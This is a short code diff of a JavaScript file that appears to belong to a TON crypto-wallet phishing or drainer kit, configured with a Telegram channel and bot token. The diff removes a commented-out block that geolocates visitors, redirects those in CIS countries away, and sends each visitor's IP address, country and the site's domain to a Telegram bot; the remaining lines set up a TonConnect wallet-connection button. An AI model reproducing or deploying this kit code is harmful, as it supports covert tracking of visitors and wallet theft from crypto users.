@@ -5,34 +5,6 @@ var tgChat = "@pawscheker"; // Ваш телеграмм-канал
 var domain = window.location.hostname;
 var ipUser;
 
-// Перенаправление стран СНГ закомментировано
-/*
-fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
-    const country = data.country;
-    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
-        window.location.replace('https://ton.org');
-    }
-    ipUser = data.ip;
-    countryUser = data.country;
-    console.log('IP: ' + ipUser);
-    console.log('Country: ' + countryUser)
-    const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
-    const encodedMessageOpen = encodeURIComponent(messageOpen);
-    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageOpen}&parse_mode=Markdown`;
-    fetch(url, {
-        method: 'POST',
-    }).then(response => {
-        if (response.ok) {
-            console.log('Success send.');
-        } else {
-            console.error('Error send.');
-        }
-    }).catch(error => {
-        console.error('Error: ', error);
-    });
-}).catch(error => console.error('Error IP:', error));
-*/
-
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
     buttonRootId: 'ton-connect'
